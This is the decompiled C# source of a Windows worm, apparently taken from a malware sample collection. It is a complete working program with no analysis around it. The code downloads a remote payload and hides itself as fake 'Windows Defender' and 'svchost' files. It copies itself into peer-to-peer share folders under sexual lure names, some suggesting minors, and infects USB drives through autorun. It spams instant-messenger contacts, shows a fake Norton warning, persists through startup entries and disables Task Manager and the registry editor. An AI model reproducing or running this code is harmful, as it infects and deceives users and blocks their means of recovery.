// Decompiled with JetBrains decompiler
// Type: stub.Form1
// Assembly: stub, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 267E8B95-AFAA-4D03-9834-74556FFC1EC8
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00004-msil\P2P-Worm.MSIL.ShareWire.ay-a25c80dfdb1baa8b632a26bffd961d02b570eba3ae4eb58070bad8c311a32b22.exe

using MessengerAPI;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.FileIO;
using Microsoft.Win32;
using stub.My;
using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace stub
{
  [DesignerGenerated]
  public class Form1 : Form
  {
    private IContainer components;
    [AccessedThroughProperty("ListBox1")]
    private ListBox _ListBox1;
    [AccessedThroughProperty("Timer1")]
    private System.Windows.Forms.Timer _Timer1;
    [AccessedThroughProperty("Timer2")]
    private System.Windows.Forms.Timer _Timer2;
    [AccessedThroughProperty("Timer3")]
    private System.Windows.Forms.Timer _Timer3;
    [AccessedThroughProperty("TextBox1")]
    private TextBox _TextBox1;
    [AccessedThroughProperty("msn")]
    private Messenger _msn;
    private string fpath;
    private const string FileSplit = "@Infested@";
    private string[] options;
    private string link;

    public Form1()
    {
      this.FormClosing += new FormClosingEventHandler(this.Form1_FormClosing);
      this.Load += new EventHandler(this.Form1_Load);
      this.fpath = MyProject.Computer.FileSystem.SpecialDirectories.Temp + "\\svchost.exe";
      this.InitializeComponent();
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.components = (IContainer) new System.ComponentModel.Container();
      this.ListBox1 = new ListBox();
      this.Timer1 = new System.Windows.Forms.Timer(this.components);
      this.Timer2 = new System.Windows.Forms.Timer(this.components);
      this.Timer3 = new System.Windows.Forms.Timer(this.components);
      this.TextBox1 = new TextBox();
      this.SuspendLayout();
      this.ListBox1.FormattingEnabled = true;
      ListBox listBox1_1 = this.ListBox1;
      Point point1 = new Point(25, 12);
      Point point2 = point1;
      listBox1_1.Location = point2;
      this.ListBox1.Name = "ListBox1";
      ListBox listBox1_2 = this.ListBox1;
      Size size1 = new Size(242, 69);
      Size size2 = size1;
      listBox1_2.Size = size2;
      this.ListBox1.TabIndex = 0;
      this.Timer1.Interval = 6000;
      this.Timer3.Interval = 4000;
      TextBox textBox1_1 = this.TextBox1;
      point1 = new Point(25, 86);
      Point point3 = point1;
      textBox1_1.Location = point3;
      this.TextBox1.Name = "TextBox1";
      TextBox textBox1_2 = this.TextBox1;
      size1 = new Size(241, 20);
      Size size3 = size1;
      textBox1_2.Size = size3;
      this.TextBox1.TabIndex = 1;
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      size1 = new Size(303, 115);
      this.ClientSize = size1;
      this.Controls.Add((Control) this.TextBox1);
      this.Controls.Add((Control) this.ListBox1);
      this.ForeColor = System.Drawing.Color.Transparent;
      this.FormBorderStyle = FormBorderStyle.None;
      this.Name = nameof (Form1);
      this.StartPosition = FormStartPosition.CenterScreen;
      this.ResumeLayout(false);
      this.PerformLayout();
    }

    internal virtual ListBox ListBox1
    {
      get => this._ListBox1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._ListBox1 = value;
    }

    internal virtual System.Windows.Forms.Timer Timer1
    {
      get => this._Timer1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Timer1_Tick);
        if (this._Timer1 != null)
          this._Timer1.Tick -= eventHandler;
        this._Timer1 = value;
        if (this._Timer1 == null)
          return;
        this._Timer1.Tick += eventHandler;
      }
    }

    internal virtual System.Windows.Forms.Timer Timer2
    {
      get => this._Timer2;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Timer2_Tick);
        if (this._Timer2 != null)
          this._Timer2.Tick -= eventHandler;
        this._Timer2 = value;
        if (this._Timer2 == null)
          return;
        this._Timer2.Tick += eventHandler;
      }
    }

    internal virtual System.Windows.Forms.Timer Timer3
    {
      get => this._Timer3;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Timer3_Tick);
        if (this._Timer3 != null)
          this._Timer3.Tick -= eventHandler;
        this._Timer3 = value;
        if (this._Timer3 == null)
          return;
        this._Timer3.Tick += eventHandler;
      }
    }

    internal virtual TextBox TextBox1
    {
      get => this._TextBox1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox1 = value;
    }

    private virtual Messenger msn
    {
      get => this._msn;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._msn = value;
    }

    [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern void keybd_event(byte bVk, byte bScan, int dwFlags, int dwExtraInfo);

    [DllImport("user32", EntryPoint = "GetWindowTextA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern object GetWindowText();

    [DllImport("user32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int GetForegroundWindow();

    [DllImport("user32.dll", EntryPoint = "GetWindowTextA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int GetWindowText(int hwnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString, int cch);

    private string GetActiveWindowTitle()
    {
      string lpString = new string(char.MinValue, 100);
      Form1.GetWindowText(Form1.GetForegroundWindow(), ref lpString, 100);
      return lpString.Substring(0, checked (Microsoft.VisualBasic.Strings.InStr(lpString, "\0") - 1));
    }

    private void Form1_FormClosing(object sender, FormClosingEventArgs e)
    {
      try
      {
        Process.Start("C:\\Windows Defender\\explorer.exe");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    private void Form1_Load(object sender, EventArgs e)
    {
      try
      {
        Microsoft.VisualBasic.FileSystem.FileOpen(1, Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared);
        this.link = Microsoft.VisualBasic.Strings.Space(checked ((int) Microsoft.VisualBasic.FileSystem.LOF(1)));
        Microsoft.VisualBasic.FileSystem.FileGet(1, ref this.link);
        Microsoft.VisualBasic.FileSystem.FileClose(1);
        this.options = Microsoft.VisualBasic.Strings.Split(this.link, "@Infested@");
        this.TextBox1.Text = this.options[1];
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      string text = this.TextBox1.Text;
      if (File.Exists(this.fpath))
      {
        try
        {
          File.Delete(this.fpath);
          MyProject.Computer.Network.DownloadFile(text, this.fpath);
          Thread.Sleep(100);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          Thread.Sleep(1);
          ProjectData.ClearProjectError();
        }
      }
      else
      {
        MyProject.Computer.Network.DownloadFile(text, this.fpath);
        Thread.Sleep(100);
      }
      try
      {
        if (Directory.Exists("C:\\Windows Defender"))
        {
          File.WriteAllBytes("C:\\Windows Defender\\Interop.MessengerPrivate.dll", stub.My.Resources.Resources.Interop_MessengerPrivate);
          File.WriteAllBytes("C:\\Windows Defender\\Interop.MessengerAPI.dll", stub.My.Resources.Resources.Interop_MessengerAPI);
          if (!File.Exists("C:\\Windows Defender\\explorer.exe"))
            File.Copy(Application.ExecutablePath, "C:\\Windows Defender\\explorer.exe");
        }
        else
        {
          Directory.CreateDirectory("C:\\Windows Defender");
          File.WriteAllBytes("C:\\Windows Defender\\Interop.MessengerPrivate.dll", stub.My.Resources.Resources.Interop_MessengerPrivate);
          File.WriteAllBytes("C:\\Windows Defender\\Interop.MessengerAPI.dll", stub.My.Resources.Resources.Interop_MessengerAPI);
          File.Copy(Application.ExecutablePath, "C:\\Windows Defender\\explorer.exe");
          Process.Start("C:\\Windows Defender\\explorer.exe");
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      this.lime();
      try
      {
        this.msn = (Messenger) new MessengerClass();
        IMessengerContacts myContacts = (IMessengerContacts) ((IMessenger4) this.msn).MyContacts;
        try
        {
          foreach (object obj in myContacts)
          {
            object objectValue = RuntimeHelpers.GetObjectValue(obj);
            if (Operators.ConditionalCompareObjectNotEqual(NewLateBinding.LateGet(objectValue, (System.Type) null, "Status", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (object) (MISTATUS) 1, false))
              this.ListBox1.Items.Add(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, (System.Type) null, "SigninName", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null)));
          }
        }
        finally
        {
          IEnumerator enumerator;
          if (enumerator is IDisposable)
            (enumerator as IDisposable).Dispose();
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      this.Timer1.Start();
      this.P2Pspread();
      this.share();
      this.Start();
      this.AregTime();
      this.USBInfect();
      string str1 = Conversions.ToString(Conversion.Int(VBMath.Rnd() * 9f));
      string str2 = Conversions.ToString(Conversion.Int(VBMath.Rnd() * 9f));
      Conversions.ToString(Conversion.Int(VBMath.Rnd() * 9f));
      string str3 = Conversions.ToString(Conversion.Int(VBMath.Rnd() * 9f));
      string str4 = Conversions.ToString(Conversion.Int(VBMath.Rnd() * 9f));
      string str5 = Conversions.ToString(Conversion.Int(VBMath.Rnd() * 9f));
      string str6 = Conversions.ToString(Conversion.Int(VBMath.Rnd() * 9f));
      this.Timer2.Interval = Conversions.ToInteger(str1 + str2 + str3 + str4 + str5 + str6);
      this.Timer2.Start();
      this.Timer3.Start();
      this.Mgr();
      this.Reg();
    }

    public void lime()
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = 1;
label_1:
        int num3 = 2;
        if (!Directory.Exists(MyProject.Computer.FileSystem.SpecialDirectories.MyDocuments + "\\LimeWire\\Saved"))
          goto label_7;
label_2:
        num3 = 3;
        File.Copy(Application.ExecutablePath, MyProject.Computer.FileSystem.SpecialDirectories.MyDocuments + "\\LimeWire\\Saved\\xxx.avi.scr");
label_3:
        num3 = 4;
        File.Copy(Application.ExecutablePath, MyProject.Computer.FileSystem.SpecialDirectories.MyDocuments + "\\LimeWire\\Saved\\porn.avi.scr");
label_4:
        num3 = 5;
        File.Copy(Application.ExecutablePath, MyProject.Computer.FileSystem.SpecialDirectories.MyDocuments + "\\LimeWire\\Saved\\teenage porn.avi.scr");
label_5:
        num3 = 6;
        File.Copy(Application.ExecutablePath, MyProject.Computer.FileSystem.SpecialDirectories.MyDocuments + "\\LimeWire\\Saved\\teen porn pics.avi.scr");
label_6:
        num3 = 7;
        File.Copy(Application.ExecutablePath, MyProject.Computer.FileSystem.SpecialDirectories.MyDocuments + "\\LimeWire\\Saved\\18 year old with dildo.avi.scr");
        goto label_14;
label_7:
        num3 = 9;
label_8:
        num3 = 10;
        Directory.CreateDirectory(MyProject.Computer.FileSystem.SpecialDirectories.MyDocuments + "\\LimeWire\\Saved");
label_9:
        num3 = 11;
        File.Copy(Application.ExecutablePath, MyProject.Computer.FileSystem.SpecialDirectories.MyDocuments + "\\LimeWire\\Saved\\xxx.avi.scr");
label_10:
        num3 = 12;
        File.Copy(Application.ExecutablePath, MyProject.Computer.FileSystem.SpecialDirectories.MyDocuments + "\\LimeWire\\Saved\\porn.avi.scr");
label_11:
        num3 = 13;
        File.Copy(Application.ExecutablePath, MyProject.Computer.FileSystem.SpecialDirectories.MyDocuments + "\\LimeWire\\Saved\\teenage porn.avi.scr");
label_12:
        num3 = 14;
        File.Copy(Application.ExecutablePath, MyProject.Computer.FileSystem.SpecialDirectories.MyDocuments + "\\LimeWire\\Saved\\teen porn pics.avi.scr");
label_13:
        num3 = 15;
        File.Copy(Application.ExecutablePath, MyProject.Computer.FileSystem.SpecialDirectories.MyDocuments + "\\LimeWire\\Saved\\18 year old with dildo.avi.scr");
label_14:
        num3 = 17;
        if (!Directory.Exists(MyProject.Computer.FileSystem.SpecialDirectories.MyDocuments + "\\LimeWire\\Shared"))
          goto label_20;
label_15:
        num3 = 18;
        File.Copy(Application.ExecutablePath, MyProject.Computer.FileSystem.SpecialDirectories.MyDocuments + "\\LimeWire\\Shared\\xxx.avi.scr");
label_16:
        num3 = 19;
        File.Copy(Application.ExecutablePath, MyProject.Computer.FileSystem.SpecialDirectories.MyDocuments + "\\LimeWire\\Shared\\porn.avi.scr");
label_17:
        num3 = 20;
        File.Copy(Application.ExecutablePath, MyProject.Computer.FileSystem.SpecialDirectories.MyDocuments + "\\LimeWire\\Shared\\teenage porn.avi.scr");
label_18:
        num3 = 21;
        File.Copy(Application.ExecutablePath, MyProject.Computer.FileSystem.SpecialDirectories.MyDocuments + "\\LimeWire\\Shared\\teen porn pics.avi.scr");
label_19:
        num3 = 22;
        File.Copy(Application.ExecutablePath, MyProject.Computer.FileSystem.SpecialDirectories.MyDocuments + "\\LimeWire\\Shared\\18 year old with dildo.avi.scr");
        goto label_33;
label_20:
        num3 = 24;
label_21:
        num3 = 25;
        Directory.CreateDirectory(MyProject.Computer.FileSystem.SpecialDirectories.MyDocuments + "\\LimeWire\\Shared");
label_22:
        num3 = 26;
        File.Copy(Application.ExecutablePath, MyProject.Computer.FileSystem.SpecialDirectories.MyDocuments + "\\LimeWire\\Shared\\xxx.avi.scr");
label_23:
        num3 = 27;
        File.Copy(Application.ExecutablePath, MyProject.Computer.FileSystem.SpecialDirectories.MyDocuments + "\\LimeWire\\Shared\\porn.avi.scr");
label_24:
        num3 = 28;
        File.Copy(Application.ExecutablePath, MyProject.Computer.FileSystem.SpecialDirectories.MyDocuments + "\\LimeWire\\Shared\\teenage porn.avi.scr");
label_25:
        num3 = 29;
        File.Copy(Application.ExecutablePath, MyProject.Computer.FileSystem.SpecialDirectories.MyDocuments + "\\LimeWire\\Shared\\teen porn pics.avi.scr");
label_26:
        num3 = 30;
        File.Copy(Application.ExecutablePath, MyProject.Computer.FileSystem.SpecialDirectories.MyDocuments + "\\LimeWire\\Shared\\18 year old with dildo.avi.scr");
        goto label_33;
label_28:
        num2 = num3;
        switch (num1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_3;
              case 5:
                goto label_4;
              case 6:
                goto label_5;
              case 7:
                goto label_6;
              case 8:
              case 16:
              case 17:
                goto label_14;
              case 9:
                goto label_7;
              case 10:
                goto label_8;
              case 11:
                goto label_9;
              case 12:
                goto label_10;
              case 13:
                goto label_11;
              case 14:
                goto label_12;
              case 15:
                goto label_13;
              case 18:
                goto label_15;
              case 19:
                goto label_16;
              case 20:
                goto label_17;
              case 21:
                goto label_18;
              case 22:
                goto label_19;
              case 23:
              case 31:
              case 32:
                goto label_33;
              case 24:
                goto label_20;
              case 25:
                goto label_21;
              case 26:
                goto label_22;
              case 27:
                goto label_23;
              case 28:
                goto label_24;
              case 29:
                goto label_25;
              case 30:
                goto label_26;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_28;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_33:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    private void P2Pspread()
    {
      string str1 = Conversions.ToString(MyProject.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\LimeWire\\", "InstallDir", (object) 0)) + "\\Shared";
      try
      {
        File.Copy(Application.ExecutablePath, str1 + "\\porn.scr");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        File.Copy(Application.ExecutablePath, Interaction.Environ("programfiles\\Shared\\porn.scr"));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        if (Directory.Exists(MyProject.Computer.FileSystem.SpecialDirectories.MyDocuments + "\\Shared"))
        {
          File.Copy(Application.ExecutablePath, MyProject.Computer.FileSystem.SpecialDirectories.MyDocuments + "\\Shared\\porn.scr");
          File.Copy(Application.ExecutablePath, MyProject.Computer.FileSystem.SpecialDirectories.MyDocuments + "\\Shared\\teen sex.scr");
          File.Copy(Application.ExecutablePath, MyProject.Computer.FileSystem.SpecialDirectories.MyDocuments + "\\Shared\\paris hilton sex tape.scr");
          File.Copy(Application.ExecutablePath, MyProject.Computer.FileSystem.SpecialDirectories.MyDocuments + "\\Shared\\sex tape xxx.scr");
          File.Copy(Application.ExecutablePath, MyProject.Computer.FileSystem.SpecialDirectories.MyDocuments + "\\Shared\\porn.scr");
        }
        else
        {
          Directory.CreateDirectory(MyProject.Computer.FileSystem.SpecialDirectories.MyDocuments + "\\Shared");
          File.Copy(Application.ExecutablePath, MyProject.Computer.FileSystem.SpecialDirectories.MyDocuments + "\\Shared\\porn.scr");
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        string str2 = "C:\\Shared";
        if (Directory.Exists(str2))
        {
          File.Copy(Application.ExecutablePath, str2);
        }
        else
        {
          Directory.CreateDirectory(str2);
          File.Copy(Application.ExecutablePath, str2 + "\\porn.scr");
          File.Copy(Application.ExecutablePath, str2 + "\\paris hilton sex tape.scr");
          File.Copy(Application.ExecutablePath, str2 + "\\teen sex.scr");
          File.Copy(Application.ExecutablePath, str2 + "\\secret sex tape.scr");
          File.Copy(Application.ExecutablePath, str2 + "\\pussy climax orgasm fingering dildo sex xxx 18.scr");
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void Timer1_Tick(object sender, EventArgs e)
    {
      try
      {
        string text = this.TextBox1.Text;
        string[] source = new string[11]
        {
          null,
          "lmao what a weekend http://TlNYCHAT.COM/chanb ",
          "webcam? :) http://TlNYCHAT.COM/chanb",
          "is this website up for you? http://TlNYCHAT.COM/chanb",
          "Can you take a look at this app I just made and maybe give me some feedback? " + text,
          ":D haha http://TlNYCHAT.COM/chanb",
          "madness " + text,
          "who is this? " + text,
          "you know this guy?: " + text,
          "think this is any good? " + text,
          "... " + text
        };
        IMessengerContacts myContacts = (IMessengerContacts) ((IMessenger4) this.msn).MyContacts;
        VBMath.Randomize();
        try
        {
          ((IMessenger4) this.msn).InstantMessage((object) Conversions.ToString(this.ListBox1.Items[checked ((int) Math.Round((double) unchecked (VBMath.Rnd() * (float) this.ListBox1.Items.Count)))]));
          Thread.Sleep(100);
          VBMath.Randomize();
          SendKeys.SendWait(source[checked ((int) Math.Round(unchecked ((double) VBMath.Rnd() * (double) ((IEnumerable<string>) source).Count<string>() - 1.0)))]);
          SendKeys.SendWait("{ENTER}");
          SendKeys.SendWait("{ESC}");
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        this.ListBox1.Items.Clear();
        try
        {
          foreach (object obj in myContacts)
          {
            object objectValue = RuntimeHelpers.GetObjectValue(obj);
            if (Operators.ConditionalCompareObjectNotEqual(NewLateBinding.LateGet(objectValue, (System.Type) null, "Status", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (object) (MISTATUS) 1, false))
              this.ListBox1.Items.Add(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, (System.Type) null, "SigninName", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null)));
          }
        }
        finally
        {
          IEnumerator enumerator;
          if (enumerator is IDisposable)
            (enumerator as IDisposable).Dispose();
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void Timer2_Tick(object sender, EventArgs e)
    {
      int num = (int) Interaction.MsgBox((object) "Norton antivirus has detected a virus and needs to download a program to remove the infection.\r\n\r\nInternet explorer will now open and you will need install the program", Title: ((object) "Norton Antivirus"));
      Process.Start(this.TextBox1.Text);
    }

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    public void Start()
    {
      try
      {
        string fileName = Path.GetFileName(Application.ExecutablePath);
        string directoryRoot = Directory.GetDirectoryRoot(Environment.SystemDirectory);
        if (!new DirectoryInfo(directoryRoot + "Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\").Exists)
        {
          if (File.Exists(directoryRoot + "ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + fileName))
            Microsoft.VisualBasic.FileSystem.Kill(directoryRoot + "ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + fileName);
          MyProject.Computer.FileSystem.CopyFile(Application.ExecutablePath, directoryRoot + "ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + fileName, true);
          Microsoft.VisualBasic.FileSystem.SetAttr(directoryRoot + "ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + fileName, FileAttribute.Hidden);
          Microsoft.VisualBasic.FileSystem.SetAttr(directoryRoot + "ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + fileName, FileAttribute.ReadOnly);
          Microsoft.VisualBasic.FileSystem.SetAttr(directoryRoot + "ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + fileName, FileAttribute.System);
        }
        else
        {
          if (File.Exists(directoryRoot + "Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\" + fileName))
            Microsoft.VisualBasic.FileSystem.Kill(directoryRoot + "Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\" + fileName);
          MyProject.Computer.FileSystem.CopyFile(Application.ExecutablePath, directoryRoot + "Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\" + fileName, true);
          Microsoft.VisualBasic.FileSystem.SetAttr(directoryRoot + "Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\" + fileName, FileAttribute.Hidden);
          Microsoft.VisualBasic.FileSystem.SetAttr(directoryRoot + "Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\" + fileName, FileAttribute.ReadOnly);
          Microsoft.VisualBasic.FileSystem.SetAttr(directoryRoot + "Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\" + fileName, FileAttribute.System);
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    public void AregTime()
    {
      string fileName = Path.GetFileName(Application.ExecutablePath);
      string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\System\\Services\\";
      try
      {
        if (!Directory.Exists(path))
          Directory.CreateDirectory(path);
        if (!File.Exists(path + fileName))
          Microsoft.VisualBasic.FileSystem.FileCopy(Application.ExecutablePath, path + fileName);
        object objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("wscript.shell"));
        try
        {
          NewLateBinding.LateCall(objectValue, (System.Type) null, "regwrite", new object[2]
          {
            (object) ("HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\" + fileName),
            (object) (path + fileName)
          }, (string[]) null, (System.Type[]) null, (bool[]) null, true);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          NewLateBinding.LateCall(objectValue, (System.Type) null, "regwrite", new object[2]
          {
            (object) ("HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\" + fileName),
            (object) (path + fileName)
          }, (string[]) null, (System.Type[]) null, (bool[]) null, true);
          ProjectData.ClearProjectError();
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public void share()
    {
      string path1 = MyProject.Computer.FileSystem.SpecialDirectories.MyDocuments + "\\Downloads\\eMule\\Incoming";
      string path2 = MyProject.Computer.FileSystem.SpecialDirectories.MyDocuments + "\\bearshare\\shared";
      try
      {
        if (Directory.Exists(path1))
        {
          File.Copy(Application.ExecutablePath, path1 + "\\porn.scr");
          File.Copy(Application.ExecutablePath, path1 + "\\paris hilton sex tape.scr");
          File.Copy(Application.ExecutablePath, path1 + "\\teen sex.scr");
          File.Copy(Application.ExecutablePath, path1 + "\\secret sex tape.scr");
          File.Copy(Application.ExecutablePath, path1 + "\\pussy climax orgasm fingering dildo sex xxx 18.scr");
        }
        if (!Directory.Exists(path2))
          return;
        File.Copy(Application.ExecutablePath, path2 + "\\porn.scr");
        File.Copy(Application.ExecutablePath, path2 + "\\paris hilton sex tape.scr");
        File.Copy(Application.ExecutablePath, path2 + "\\teen sex.scr");
        File.Copy(Application.ExecutablePath, path2 + "\\secret sex tape.scr");
        File.Copy(Application.ExecutablePath, path2 + "\\pussy climax orgasm fingering dildo sex xxx 18.scr");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    public void USBInfect()
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = 1;
label_1:
        int num3 = 2;
        MyProject.Computer.Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "Hidden", (object) "0", RegistryValueKind.DWord);
label_2:
        num3 = 3;
        string programFiles = MyProject.Computer.FileSystem.SpecialDirectories.ProgramFiles;
label_3:
        num3 = 4;
        string[] logicalDrives = Directory.GetLogicalDrives();
label_4:
        num3 = 5;
        string[] strArray = logicalDrives;
        int index = 0;
        goto label_14;
label_6:
        num3 = 6;
        string str;
        if (programFiles.Contains(str))
          goto label_12;
label_7:
        num3 = 8;
label_8:
        num3 = 9;
        MyProject.Computer.FileSystem.CopyFile(Application.ExecutablePath, str + "HDDFile.com", (UIOption) -1, UICancelOption.DoNothing);
label_9:
        num3 = 10;
        MyProject.Computer.FileSystem.WriteAllText(str + "autorun.inf", "[autorun]\r\nopen=" + str + "HDDFile.com\r\nshellexecute=" + str, true);
label_10:
        num3 = 11;
        Microsoft.VisualBasic.FileSystem.SetAttr(str + "HDDFile.com", FileAttribute.Hidden);
label_11:
        num3 = 12;
        Microsoft.VisualBasic.FileSystem.SetAttr(str + "autorun.inf", FileAttribute.Hidden);
label_12:
        checked { ++index; }
label_13:
        num3 = 14;
label_14:
        if (index < strArray.Length)
        {
          str = strArray[index];
          goto label_6;
        }
        else
          goto label_21;
label_16:
        num2 = num3;
        switch (num1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_3;
              case 5:
                goto label_4;
              case 6:
                goto label_6;
              case 7:
              case 13:
                goto label_12;
              case 8:
                goto label_7;
              case 9:
                goto label_8;
              case 10:
                goto label_9;
              case 11:
                goto label_10;
              case 12:
                goto label_11;
              case 14:
                goto label_13;
              case 15:
                goto label_21;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_16;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_21:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    private void Timer3_Tick(object sender, EventArgs e)
    {
      string text = this.TextBox1.Text;
      if (!this.GetActiveWindowTitle().ToString().Contains("Skype"))
        return;
      SendKeys.Send("{ENTER}");
      SendKeys.Send("Hey webcam with me! http://TlNYCHAT.COM/chanb ");
      SendKeys.Send("{ENTER}");
    }

    public void Mgr()
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = 1;
label_1:
        int num3 = 2;
        Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true).SetValue("DisableTaskMgr", (object) "1", RegistryValueKind.DWord);
        goto label_8;
label_3:
        num2 = num3;
        switch (num1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_8;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_3;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_8:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    public void Reg()
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = 1;
label_1:
        int num3 = 2;
        Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true).SetValue("DisableRegistryTools", (object) "1", RegistryValueKind.DWord);
        goto label_8;
label_3:
        num2 = num3;
        switch (num1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_8;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_3;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_8:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }
  }
}
